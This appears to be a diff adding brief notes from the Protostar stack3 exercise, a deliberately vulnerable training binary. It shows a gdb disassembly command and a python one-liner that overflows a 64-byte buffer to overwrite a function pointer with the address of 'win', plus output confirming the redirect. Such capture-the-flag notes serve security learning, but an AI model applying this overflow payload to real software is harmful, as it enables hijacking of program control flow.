@@ -1,0 +1,7 @@
+gdb ./stack3
+(gdb) disass win
+
+user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3 
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+
